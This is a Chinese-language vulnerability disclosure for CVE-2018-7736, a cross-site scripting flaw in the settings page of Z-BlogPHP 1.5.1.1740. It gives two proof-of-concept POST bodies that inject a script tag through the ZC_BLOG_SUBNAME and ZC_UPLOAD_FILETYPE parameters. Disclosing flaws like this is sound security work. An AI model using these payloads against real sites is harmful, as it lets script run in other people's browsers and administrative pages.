### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Z-Blog 1.5.1.1740存在XSS漏洞|2018-04-05|zzw (zzw@5ecurity.cn)|[https://www.zblogcn.com/](https://www.zblogcn.com/) | [https://github.com/zblogcn/zblogphp](https://github.com/zblogcn/zblogphp) |1.5.1.1740| [CVE-2018-7736](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7736)|  

#### 漏洞概述  

> Z-BlogPHP 1.5.1.1740版本的cmd.php页面ZC_BLOG_SUBNAME及ZC_UPLOAD_FILETYPE参数过滤不严格可导致跨站脚本漏洞。  

### POC实现代码如下：  

> ZC_BLOG_SUBNAME参数poc代码:

``` raw
post_url：http://localhost/z-blog/zb_system/cmd.php?act=SettingSav&token=2c7ca9a4c1c3d856e012595ca878564f
 
post_data:
 
ZC_BLOG_HOST=http%3A%2F%2Flocalhost%2Fz-blog%2F&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good%20Luck%20To%20You!tluf3%22%3e%3cscript%3ealert(1)%3c%2fscript%3euk095&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia%2FShanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg%7Cgif%7Cpng%7Cjpeg%7Cbmp%7Cpsd%7Cwmf%7Cico%7Crpm%7Cdeb%7Ctar%7Cgz%7Csit%7C7z%7Cbz2%7Czip%7Crar%7Cxml%7Cxsl%7Csvg%7Csvgz%7Crtf%7Cdoc%7Cdocx%7Cppt%7Cpptx%7Cxls%7Cxlsx%7Cwps%7Cchm%7Ctxt%7Cpdf%7Cmp3%7Cmp4%7Cavi%7Cmpg%7Crm%7Cra%7Crmvb%7Cmov%7Cwmv%7Cwma%7Cswf%7Cfla%7Ctorrent%7Capk%7Czba%7Cgzba&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE=

```
> ZC_UPLOAD_FILETYPE参数poc代码:  

```raw
post_data:
 
ZC_BLOG_HOST=http://localhost/z-blog/&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good+Luck+To+You!&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia/Shanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg|gif|png|jpeg|bmp|psd|wmf|ico|rpm|deb|tar|gz|sit|7z|bz2|zip|rar|xml|xsl|svg|svgz|rtf|doc|docx|ppt|pptx|xls|xlsx|wps|chm|txt|pdf|mp3|mp4|avi|mpg|rm|ra|rmvb|mov|wmv|wma|swf|fla|torrent|apk|zba|gzbauckek"><script>alert(1)</script>ekkgh&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE=
```